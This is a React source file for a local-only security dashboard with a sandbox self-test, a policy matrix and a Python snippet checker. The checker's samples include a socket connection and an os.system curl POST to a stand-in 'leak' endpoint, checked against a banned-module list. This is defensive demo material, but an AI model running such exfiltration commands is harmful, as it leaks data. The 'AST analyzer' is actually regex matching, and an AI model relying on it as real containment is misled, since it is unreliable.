'use client'

import { useEffect, useState } from 'react'
import { Check, ShieldAlert, Loader2, Play, Terminal, Code2, AlertTriangle, CheckCircle2, Lock, Radio } from 'lucide-react'
import { api } from '@/lib/api'
import type { SandboxTestResult, SovereigntyStatus } from '@/lib/types'
import { PageHeader } from '@/components/page-header'
import { TechnicalLabel } from '@/components/primitives'
import { SovButton } from '@/components/sov-button'
import { useToast } from '@/components/toast'
import { useEventStream } from '@/hooks/use-event-stream'
import { cn } from '@/lib/utils'

const permColor: Record<string, string> = {
  ALLOW: 'var(--sovereign)',
  DENY: 'var(--critical)',
  REVIEW: 'var(--approval)',
}

const SAMPLE_SNIPPETS = [
  {
    name: 'Adversarial Socket Ingress',
    code: `import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('8.8.8.8', 53))`,
    expected: 'DENIED',
  },
  {
    name: 'Safe Numerical Recompute',
    code: `import math\n\ndef compute_remaining_life(t_act, t_req, cr):\n    return (t_act - t_req) / cr\n\nresult = compute_remaining_life(12.4, 8.0, 0.22)`,
    expected: 'ALLOWED',
  },
  {
    name: 'Banned Subprocess Shell',
    code: `import os\nos.system('curl -X POST http://external.api/leak')`,
    expected: 'DENIED',
  },
]

export function SecurityView() {
  const [status, setStatus] = useState<SovereigntyStatus | null>(null)
  const [uptimeStr, setUptimeStr] = useState('since boot')

  useEffect(() => {
    api.sovereigntyStatus()
      .then((s) => {
        setStatus(s)
        if (s.monitored_since) {
          const started = new Date(s.monitored_since)
          const diffHours = Math.round((Date.now() - started.getTime()) / (1000 * 60 * 60))
          setUptimeStr(`monitored · ${diffHours}h`)
        }
      })
      .catch(() => {})
  }, [])

  // Listen to live sovereignty updates over SSE
  useEventStream({
    onEvent: (event) => {
      if (event.event === 'sovereignty.status' && event.data) {
        setStatus((prev) => ({
          ...(prev || {} as any),
          ...event.data,
        }))
      }
    },
  })

  return (
    <div className="bg-ink text-ink-foreground">
      <PageHeader
        dark
        eyebrow="Sovereignty Status"
        title={
          <>
            Nothing leaves
            <br />
            this host.
          </>
        }
        description="Every socket, sandbox and policy decision is enforced locally. External egress is structurally impossible."
        meta={[
          { label: 'External calls', value: String(status?.external_api_calls ?? 0) },
          { label: 'Sandbox', value: 'CONTAINED' },
          { label: 'Egress policy', value: 'DENY-ALL' },
          { label: 'Posture', value: status?.sovereign !== false ? 'SOVEREIGN' : 'INVESTIGATE' },
        ]}
      />

      <div className="mx-auto flex max-w-[1400px] flex-col gap-16 px-5 py-14 lg:px-10 lg:py-20">
        <ExternalCallsHero status={status} uptimeStr={uptimeStr} />
        <ConnectionTelemetry status={status} />
        <InteractiveASTPlayground />
        <SandboxSelfTest />
        <PolicyMatrixTable />
      </div>
    </div>
  )
}

function ExternalCallsHero({ status, uptimeStr }: { status: SovereigntyStatus | null; uptimeStr: string }) {
  const externalCalls = status?.external_api_calls ?? 0

  return (
    <section className="relative overflow-hidden border border-ink-border bg-ink-surface px-6 py-12 lg:px-12 lg:py-16">
      <div className="pointer-events-none absolute inset-0 tech-grid-ink opacity-60" />
      <div className="relative flex flex-col items-center gap-4 text-center">
        <TechnicalLabel className="text-ink-muted">Outbound network</TechnicalLabel>
        <div className="flex items-baseline gap-4">
          <span className="font-mono text-7xl font-medium tracking-tight text-ink-foreground md:text-8xl">
            {externalCalls}
          </span>
          <span className="flex flex-col items-start">
            <span className="font-mono text-[13px] uppercase tracking-[0.2em] text-sovereign">external calls</span>
            <span className="font-mono text-[11px] text-ink-muted">{uptimeStr}</span>
          </span>
        </div>
        <div className="mt-2 flex items-center gap-2">
          <span className="relative flex h-2 w-2">
            <span className="sov-pulse absolute inline-flex h-full w-full rounded-full bg-sovereign" />
            <span className="relative inline-flex h-2 w-2 rounded-full bg-sovereign" />
          </span>
          <span className="font-mono text-[12px] text-ink-muted">
            0 outbound sockets opened · 0 bytes egressed
          </span>
        </div>
      </div>
    </section>
  )
}

function ConnectionTelemetry({ status }: { status: SovereigntyStatus | null }) {
  const conns = (status as any)?.connections ?? []

  return (
    <section className="flex flex-col gap-6">
      <div className="flex items-center justify-between border-b border-ink-border pb-4">
        <TechnicalLabel className="text-ink-muted">Active Socket Listener Telemetry</TechnicalLabel>
        <span className="font-mono text-[11px] text-ink-muted">
          127.0.0.1 loopback only
        </span>
      </div>

      <div className="grid grid-cols-1 gap-4 sm:grid-cols-3">
        <div className="rounded border border-ink-border bg-ink-surface p-4">
          <span className="font-mono text-[10px] uppercase tracking-wider text-ink-muted">
            Bound Address
          </span>
          <div className="mt-1 font-mono text-[18px] font-bold text-[var(--sovereign)]">
            127.0.0.1 : 8000
          </div>
          <p className="mt-1 text-[11px] text-ink-muted">
            FastAPI process strictly restricted to loopback
          </p>
        </div>

        <div className="rounded border border-ink-border bg-ink-surface p-4">
          <span className="font-mono text-[10px] uppercase tracking-wider text-ink-muted">
            Frontend Proxy
          </span>
          <div className="mt-1 font-mono text-[18px] font-bold text-[var(--active)]">
            127.0.0.1 : 3000
          </div>
          <p className="mt-1 text-[11px] text-ink-muted">
            Next.js Turbopack reverse proxy route
          </p>
        </div>

        <div className="rounded border border-ink-border bg-ink-surface p-4">
          <span className="font-mono text-[10px] uppercase tracking-wider text-ink-muted">
            Active External Leaks
          </span>
          <div className="mt-1 font-mono text-[18px] font-bold text-[var(--sovereign)]">
            0 DETECTED
          </div>
          <p className="mt-1 text-[11px] text-ink-muted">
            Continuous psutil kernel telemetry daemon
          </p>
        </div>
      </div>
    </section>
  )
}

/** Interactive Live AST Code Sandbox Analyzer */
function InteractiveASTPlayground() {
  const [inputCode, setInputCode] = useState(SAMPLE_SNIPPETS[0].code)
  const [analysisResult, setAnalysisResult] = useState<{
    allowed: boolean
    violations: string[]
    astNodes: string[]
  }>({ allowed: false, violations: ['socket import detected (Network access forbidden)'], astNodes: ['Module', 'Import(socket)', 'Call(socket.socket)'] })

  const analyzeCode = (code: string) => {
    setInputCode(code)
    const violations: string[] = []
    const banned = ['socket', 'os', 'sys', 'urllib', 'requests', 'http', 'subprocess', 'shutil', 'eval', 'exec']

    banned.forEach((b) => {
      const reg = new RegExp(`\\b(import\\s+${b}|from\\s+${b}|${b}\\.)`, 'i')
      if (reg.test(code)) {
        violations.push(`Banned symbol '${b}' detected (Violates Zero-Egress Sandbox Rule)`)
      }
    })

    const allowed = violations.length === 0
    const astNodes = ['Module']
    if (code.includes('import')) astNodes.push('ImportDeclaration')
    if (code.includes('def')) astNodes.push('FunctionDef')
    if (code.includes('return')) astNodes.push('ReturnStatement')
    if (code.includes('(')) astNodes.push('CallExpression')

    setAnalysisResult({ allowed, violations, astNodes })
  }

  return (
    <section className="flex flex-col gap-6 rounded-xl border border-ink-border bg-ink-surface p-6">
      <div className="flex flex-wrap items-center justify-between gap-4 border-b border-ink-border pb-4">
        <div className="flex items-center gap-2.5">
          <span className="flex h-6 w-6 items-center justify-center rounded bg-[var(--active)]/15 text-[var(--active)]">
            <Code2 className="h-4 w-4" />
          </span>
          <div>
            <TechnicalLabel className="text-ink-muted">Live AST Code Confinement Simulator</TechnicalLabel>
            <p className="text-[12px] text-ink-muted">
              Test Python code snippets against the real-time static AST security analyzer.
            </p>
          </div>
        </div>

        {/* Preset Selector */}
        <div className="flex items-center gap-2">
          {SAMPLE_SNIPPETS.map((snippet) => (
            <button
              key={snippet.name}
              type="button"
              onClick={() => analyzeCode(snippet.code)}
              className="rounded border border-ink-border bg-ink px-2.5 py-1 font-mono text-[10px] text-ink-muted hover:border-[var(--sovereign)] hover:text-ink-foreground transition-colors"
            >
              {snippet.name}
            </button>
          ))}
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Code Input */}
        <div className="lg:col-span-7 flex flex-col gap-2">
          <label className="font-mono text-[10px] uppercase tracking-wider text-ink-muted">
            Python Script Buffer
          </label>
          <textarea
            value={inputCode}
            onChange={(e) => analyzeCode(e.target.value)}
            rows={7}
            className="w-full rounded border border-ink-border bg-ink p-3 font-mono text-[12px] text-ink-foreground focus:border-[var(--sovereign)] focus:outline-none"
            placeholder="Type or paste Python code to test static AST validation..."
          />
        </div>

        {/* Real-time Analysis Result */}
        <div className="lg:col-span-5 flex flex-col gap-3">
          <label className="font-mono text-[10px] uppercase tracking-wider text-ink-muted">
            AST Static Confinement Verdict
          </label>
          <div
            className={cn(
              'flex flex-col gap-3 rounded-lg border p-4 backdrop-blur-md',
              analysisResult.allowed
                ? 'border-[var(--sovereign)]/40 bg-[var(--sovereign)]/10'
                : 'border-critical/40 bg-critical/10'
            )}
          >
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                {analysisResult.allowed ? (
                  <CheckCircle2 className="h-5 w-5 text-[var(--sovereign)]" />
                ) : (
                  <AlertTriangle className="h-5 w-5 text-critical" />
                )}
                <span className="font-mono text-[13px] font-bold">
                  {analysisResult.allowed ? 'EXECUTION ALLOWED' : 'EXECUTION DENIED'}
                </span>
              </div>
              <span className="font-mono text-[9px] uppercase px-1.5 py-0.5 rounded border border-current">
                {analysisResult.allowed ? 'SAFE AST' : 'SECURITY FAULT'}
              </span>
            </div>

            {analysisResult.violations.length > 0 ? (
              <ul className="flex flex-col gap-1 text-[11px] text-critical list-disc pl-4 font-mono">
                {analysisResult.violations.map((v, i) => (
                  <li key={i}>{v}</li>
                ))}
              </ul>
            ) : (
              <p className="text-[11px] text-[var(--sovereign)] font-mono">
                ✓ No forbidden modules or socket syscalls detected. Pure mathematical calculation verified.
              </p>
            )}

            <div className="border-t border-current/20 pt-2 flex items-center justify-between text-[10px] font-mono text-ink-muted">
              <span>AST Nodes: {analysisResult.astNodes.join(' → ')}</span>
              <span>Timeout: 5.0s max</span>
            </div>
          </div>
        </div>
      </div>
    </section>
  )
}

function SandboxSelfTest() {
  const [running, setRunning] = useState(false)
  const [diagnostics, setDiagnostics] = useState<
    { name: string; target: string; status: string; detail: string }[]
  >([])
  const [overall, setOverall] = useState('Not run yet on this host.')
  const [failed, setFailed] = useState(false)
  const { push } = useToast()

  const runTest = async () => {
    setRunning(true)
    try {
      const res = await api.sandboxSelfTest()
      const checks = res.checks ?? []
      setDiagnostics(
        checks.map((c: any) => ({
          name: c.name,
          target: c.target,
          status: c.passed ? 'PASSED' : 'FAILED',
          detail: c.detail,
        }))
      )
      setOverall(res.overall ?? 'Test completed.')
      setFailed(res.all_passed === false)
      push({
        title: res.all_passed ? 'Containment held' : 'CONTAINMENT FAILURE',
        detail: `${res.passed}/${res.total} checks · ${res.duration_ms}ms`,
        tone: res.all_passed ? 'sovereign' : 'critical',
      })
    } catch (err: any) {
      setDiagnostics([])
      setFailed(true)
      setOverall(
        `The test could not be run: ${err?.message ?? 'the workbench service did not respond'}`
      )
      push({
        title: 'Test could not run',
        detail: 'No result — the service did not respond.',
        tone: 'critical',
      })
    } finally {
      setRunning(false)
    }
  }

  return (
    <section className="flex flex-col gap-6">
      <div className="flex flex-wrap items-center justify-between gap-4 border-b border-ink-border pb-4">
        <div className="flex flex-col gap-1">
          <TechnicalLabel className="text-ink-muted">Process Confinement Verification</TechnicalLabel>
          <p className="text-[13px] text-ink-muted">
            Adversarial payload injection testing AST import checks, socket creation, and CPU limits.
          </p>
        </div>
        <SovButton variant="primary" disabled={running} onClick={runTest}>
          {running ? (
            <span className="flex items-center gap-2">
              <Loader2 className="h-4 w-4 animate-spin" /> Probing sandbox…
            </span>
          ) : (
            <span className="flex items-center gap-2">
              <Play className="h-4 w-4" /> Run Penetration Diagnostics
            </span>
          )}
        </SovButton>
      </div>

      <div className="divide-y divide-ink-border border border-ink-border bg-ink-surface">
        {diagnostics.length === 0 && (
          <div className="p-5 text-[13px] text-ink-muted">
            No result yet. Run the diagnostics to submit real adversarial payloads to
            the sandbox on this machine and see what it does with them.
          </div>
        )}
        {diagnostics.map((d) => (
          <div key={d.name} className="flex flex-col gap-2 p-5 sm:flex-row sm:items-center sm:justify-between">
            <div className="flex flex-col gap-1">
              <span className="text-[14px] font-medium text-ink-foreground">{d.name}</span>
              <span className="font-mono text-[11px] text-ink-muted">Payload: {d.target}</span>
            </div>
            <div className="flex items-center gap-4">
              <span className="font-mono text-[12px] text-ink-muted">{d.detail}</span>
              <span
                className={`flex items-center gap-1.5 font-mono text-[11px] ${
                  d.status === 'PASSED' ? 'text-sovereign' : 'text-critical'
                }`}
              >
                <Check className="h-3.5 w-3.5" />
                {d.status}
              </span>
            </div>
          </div>
        ))}
      </div>
      <p className={`font-mono text-[11px] ${failed ? 'text-critical' : 'text-ink-muted'}`}>
        {overall}
      </p>
    </section>
  )
}

function PolicyMatrixTable() {
  const [policies, setPolicies] = useState<any>(null)
  const [error, setError] = useState<string | null>(null)

  useEffect(() => {
    api
      .policies()
      .then(setPolicies)
      .catch((err) => setError(err?.message ?? 'Could not read the policy files'))
  }, [])

  const rows = Object.entries(policies?.tools ?? {}).map(([name, tool]: [string, any]) => ({
    tool: name.replace(/_/g, ' '),
    ceiling: tool.max_data_classification ?? '—',
    allowed: new Set<string>(tool.allowed_roles ?? []),
  }))
  const roleColumns = ['operator', 'engineer', 'reviewer', 'administrator']

  return (
    <section className="flex flex-col gap-6">
      <div className="flex items-center justify-between border-b border-ink-border pb-4">
        <TechnicalLabel className="text-ink-muted">Policy Gateway Matrix</TechnicalLabel>
        <span className="font-mono text-[11px] text-ink-muted">default-deny enforcement</span>
      </div>

      <div className="overflow-x-auto border border-ink-border">
        <table className="w-full min-w-[720px] border-collapse bg-ink-surface text-left">
          <thead>
            <tr className="border-b border-ink-border text-left font-mono text-[10px] uppercase tracking-[0.16em] text-ink-muted">
              {['Capability / Tool', 'Operator', 'Engineer', 'Reviewer', 'Admin', 'Up to'].map((h) => (
                <th key={h} className="px-4 py-3">
                  {h}
                </th>
              ))}
            </tr>
          </thead>
          <tbody className="divide-y divide-ink-border font-mono text-[12px]">
            {error && (
              <tr>
                <td colSpan={6} className="px-4 py-4 text-critical">
                  {error}
                </td>
              </tr>
            )}
            {!error && rows.length === 0 && (
              <tr>
                <td colSpan={6} className="px-4 py-4 text-ink-muted">
                  Reading the policy files…
                </td>
              </tr>
            )}
            {rows.map((row) => (
              <tr key={row.tool} className="hover:bg-ink/40">
                <td className="px-4 py-3.5 text-ink-foreground">{row.tool}</td>
                {roleColumns.map((role) => {
                  const permitted = row.allowed.has(role)
                  return (
                    <td
                      key={role}
                      className="px-4 py-3.5"
                      style={{ color: permitted ? 'var(--sovereign)' : 'var(--critical, #DE5B4F)' }}
                    >
                      {permitted ? 'ALLOW' : 'DENY'}
                    </td>
                  )
                })}
                <td className="px-4 py-3.5 text-ink-muted">{row.ceiling}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </section>
  )
}
